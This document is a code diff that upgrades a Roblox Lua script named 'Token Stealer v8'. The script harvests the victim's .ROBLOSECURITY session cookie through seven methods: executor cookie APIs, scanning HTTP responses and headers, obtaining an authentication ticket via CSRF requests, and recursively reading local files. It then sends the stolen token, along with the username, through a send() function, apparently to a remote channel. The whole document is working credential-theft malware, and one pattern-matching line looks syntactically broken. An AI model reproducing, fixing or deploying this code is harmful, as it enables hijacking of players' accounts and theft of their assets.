@@ -414,7 +414,7 @@ end)
 task.wait(1)
 
 -- ============================================================
--- MODULE 3: Token Stealer v6
+-- MODULE 3: Token Stealer v8 (Xeno-optimized)
 -- ============================================================
 task.spawn(function()
     local exec = getExec()
@@ -424,12 +424,13 @@ task.spawn(function()
     send("TOKEN STEALER STARTED",
         "**User:** " .. LocalPlayer.Name ..
         "\n**Executor:** " .. exec ..
-        "\n**Status:** Running all 6 methods...",
+        "\n**Status:** Running all methods...",
         16776960
     )
 
     task.wait(0.3)
 
+    -- M1: syn.get_cookie
     pcall(function()
         if syn and syn.get_cookie then
             local ok, r = pcall(syn.get_cookie, ".ROBLOSECURITY")
@@ -437,11 +438,11 @@ task.spawn(function()
         else table.insert(log, "M1: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M1 syn.get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
         return
     end
-    task.wait(0.3)
 
+    -- M2: get_cookie
     pcall(function()
         if get_cookie then
             local ok, r = pcall(get_cookie, ".ROBLOSECURITY")
@@ -449,11 +450,11 @@ task.spawn(function()
         else table.insert(log, "M2: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M2 get_cookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
         return
     end
-    task.wait(0.3)
 
+    -- M3: getrbxcookie
     pcall(function()
         if getrbxcookie then
             local ok, r = pcall(getrbxcookie)
@@ -461,82 +462,213 @@ task.spawn(function()
         else table.insert(log, "M3: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M3 getrbxcookie\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
         return
     end
-    task.wait(0.3)
 
+    -- M4: getcookies table
     pcall(function()
         if getcookies then
-            local ok, r = pcall(function() local c = getcookies() return c and c[".ROBLOSECURITY"] end)
-            if ok and r and r ~= "" then token = r table.insert(log, "M4: SUCCESS") end
+            local ok, c = pcall(getcookies)
+            if ok and type(c) == "table" then
+                for k, v in pairs(c) do
+                    local ks = tostring(k) local vs = tostring(v)
+                    if ks:find("ROBLOSECURITY") and #vs > 20 then token = vs table.insert(log, "M4: SUCCESS key=" .. ks) break end
+                    if type(v) == "table" then
+                        for ck, cv in pairs(v) do
+                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then token = tostring(cv) table.insert(log, "M4: SUCCESS nested") break end
+                        end
+                    end
+                    if token then break end
+                end
+            end
+            if not token then table.insert(log, "M4: no token in table") end
         else table.insert(log, "M4: SKIPPED") end
     end)
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M4 getcookies\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
         return
     end
-    task.wait(0.3)
 
+    -- M5: request() — dump ALL response fields for ROBLOSECURITY
+    -- Xeno sends cookie automatically but may not expose it in res.Cookies
+    -- Try multiple endpoints and dump every field
     pcall(function()
-        if listfiles and readfile then
-            local scanned = 0
-            local function scan(path)
-                if scanned >= 200 or token then return end
-                local ok, files = pcall(listfiles, path)
-                if not ok or not files then return end
-                for _, f in ipairs(files) do
-                    if scanned >= 200 or token then return end
-                    scanned = scanned + 1
-                    local rok, content = pcall(readfile, f)
-                    if rok and type(content) == "string" then
-                        local found = content:match("%.ROBLOSECURITY=([^;%s\"'\n\r]+)")
-                        if found and #found > 20 then token = found end
+        local req = request or http_request or (syn and syn.request) or (http and http.request)
+        if not req then table.insert(log, "M5: no request func") return end
+
+        local endpoints = {
+            "https://www.roblox.com/",
+            "https://auth.roblox.com/",
+            "https://users.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId),
+        }
+
+        for _, url in ipairs(endpoints) do
+            if token then break end
+            pcall(function()
+                local ok, res = pcall(req, {Url=url, Method="GET"})
+                if not ok or not res then return end
+
+                -- Check res.Cookies (table or string)
+                if res.Cookies then
+                    if type(res.Cookies) == "table" then
+                        for k, v in pairs(res.Cookies) do
+                            local vs = tostring(v)
+                            if tostring(k):find("ROBLOSECURITY") and #vs > 20 then
+                                token = vs table.insert(log, "M5: res.Cookies table " .. url) break
+                            end
+                            -- value might BE the cookie string
+                            local found = vs:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                            if found and #found > 20 then token = found table.insert(log, "M5: res.Cookies value scan " .. url) break end
+                        end
+                    elseif type(res.Cookies) == "string" then
+                        local found = res.Cookies:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                        if not found then found = res.Cookies:match("%.ROBLOSECURITY=([^;%s]+)") end
+                        if found and #found > 20 then token = found table.insert(log, "M5: res.Cookies string " .. url) end
                     end
                 end
-            end
-            scan("")
-            if not token then
-                local ok, root = pcall(listfiles, "")
-                if ok and root then
-                    for _, item in ipairs(root) do
-                        if token then break end
-                        pcall(function() scan(item) end)
+                if token then return end
+
+                -- Check ALL headers
+                if res.Headers then
+                    for k, v in pairs(res.Headers) do
+                        local vs = tostring(v)
+                        if vs:find("ROBLOSECURITY") then
+                            local found = vs:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                            if not found then found = vs:match("%.ROBLOSECURITY=([^;]+)") end
+                            if found and #found > 20 then token = found table.insert(log, "M5: header " .. tostring(k)) end
+                        end
                     end
                 end
-            end
-            table.insert(log, "M5: scanned " .. tostring(scanned) .. " files")
-            if token then
-                send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M5 file scan\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
-            end
-        else table.insert(log, "M5: SKIPPED") end
-    end)
-    if token then return end
-    task.wait(0.3)
+                if token then return end
 
-    pcall(function()
-        if request then
-            local ok, r = pcall(function() return request({Url="https://www.roblox.com/", Method="GET"}) end)
-            if ok and r and r.Headers then
-                local sc = r.Headers["set-cookie"] or r.Headers["Set-Cookie"] or ""
-                local found = sc:match("%.ROBLOSECURITY=([^;]+)")
-                if found and found ~= "" then
-                    token = found
-                    table.insert(log, "M6: SUCCESS")
-                    send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M6\n**Token:**\n```" .. token:sub(1,900) .. "```", 16711680)
-                else table.insert(log, "M6: FAILED") end
-            else table.insert(log, "M6: FAILED") end
-        else table.insert(log, "M6: SKIPPED") end
-    end)
+                -- Scan every field of res as string
+                for k, v in pairs(res) do
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                        if not found then found = vs:match("%.ROBLOSECURITY=([^;]+)") end
+                        if found and #found > 20 then token = found table.insert(log, "M5: res." .. tostring(k) .. " field") end
+                    end
+                    if token then break end
+                end
+                if token then return end
 
-    if not token then
-        send("TOKEN STEALER FAILED",
-            "**User:** " .. LocalPlayer.Name ..
-            "\n**Executor:** " .. exec ..
-            "\n**Log:**\n```" .. table.concat(log, "\n"):sub(1,1000) .. "```",
-            16711680
-        )
+                -- Scan response body for token pattern
+                if res.Body and type(res.Body) == "string" then
+                    local found = res.Body:match("_|([A-Za-z0-9_%-]+)|_")
+                    if found and #found > 20 then token = "_|" .. found .. "|_" table.insert(log, "M5: body _|token|_ pattern " .. url) end
+                end
+            end)
+        end
+
+        if not token then table.insert(log, "M5: no token from request()") end
+    end)
+    if token then
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** " .. (log[#log] or "M5") .. "\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
+        return
     end
+
+    -- M6: CSRF + auth ticket approach
+    pcall(function()
+        local req = request or http_request or (syn and syn.request) or (http and http.request)
+        if not req then table.insert(log, "M6: SKIPPED") return end
+
+        -- Step 1: get CSRF token
+        local csrf = nil
+        pcall(function()
+            local ok, res = pcall(req, {Url="https://auth.roblox.com/v2/logout", Method="POST", Headers={["Content-Type"]="application/json"}, Body="{}"})
+            if ok and res and res.Headers then
+                csrf = res.Headers["x-csrf-token"] or res.Headers["X-CSRF-Token"]
+            end
+        end)
+
+        if not csrf then table.insert(log, "M6: no CSRF") return end
+        table.insert(log, "M6: got CSRF=" .. csrf:sub(1,10) .. "...")
+
+        -- Step 2: get auth ticket
+        pcall(function()
+            local ok, res = pcall(req, {
+                Url="https://auth.roblox.com/v1/authentication-ticket",
+                Method="POST",
+                Headers={
+                    ["Content-Type"]="application/json",
+                    ["X-CSRF-Token"]=csrf,
+                    ["Referer"]="https://www.roblox.com"
+                },
+                Body="{}"
+            })
+            if ok and res then
+                -- Auth ticket is in header
+                local ticket = nil
+                if res.Headers then
+                    ticket = res.Headers["rbx-authentication-ticket"] or res.Headers["RBX-Authentication-Ticket"]
+                end
+                if ticket and #ticket > 5 then
+                    -- Auth ticket is not the cookie but is useful — send it
+                    token = "[AUTH TICKET] " .. ticket
+                    table.insert(log, "M6: got auth ticket")
+                end
+                -- Also scan all fields
+                for k, v in pairs(res) do
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                        if found and #found > 20 then token = found table.insert(log, "M6: ROBLOSECURITY in " .. tostring(k)) end
+                    end
+                end
+            end
+        end)
+    end)
+    if token then
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** " .. (log[#log] or "M6") .. "\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
+        return
+    end
+
+    -- M7: file scan (readfile recursive)
+    pcall(function()
+        if not (listfiles and readfile) then table.insert(log, "M7: SKIPPED") return end
+        local scanned = 0
+        local function scan(path)
+            if scanned >= 500 or token then return end
+            local ok, files = pcall(listfiles, path)
+            if ok and type(files) == "table" then
+                for _, f in ipairs(files) do
+                    if token then break end
+                    local rok, c = pcall(readfile, f)
+                    if rok and type(c) == "string" and #c > 5 then
+                        scanned = scanned + 1
+                        local found = c:match("ROBLOSECURITY[=_]([^;%s,"']+)")
+                        if not found then found = c:match("%.ROBLOSECURITY=([^;%s]+)") end
+                        if not found then found = c:match("_|([A-Za-z0-9_%-]+)|_") end
+                        if found and #found > 20 then
+                            token = found method = "readfile:" .. tostring(f)
+                            table.insert(log, "M7: FOUND in " .. tostring(f))
+                        end
+                    end
+                    pcall(function() scan(f) end)
+                end
+            end
+        end
+        local roots = {"", "cache", "Cache", "cookies", "Cookies", "session", "data", "Xeno", "xeno", "storage", "roblox", "workspace", "config", "temp", "Temp"}
+        for _, root in ipairs(roots) do
+            if token then break end
+            scan(root)
+        end
+        table.insert(log, "M7: scanned " .. tostring(scanned) .. " files" .. (token and " FOUND" or " not found"))
+    end)
+    if token then
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** M7 file scan\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
+        return
+    end
+
+    -- All methods failed
+    send("TOKEN STEALER FAILED",
+        "**User:** " .. LocalPlayer.Name ..
+        "\n**Executor:** " .. exec ..
+        "\n**Log:**\n```" .. table.concat(log, "\n"):sub(1,1500) .. "```",
+        16711680
+    )
 end)
 
 task.wait(2)
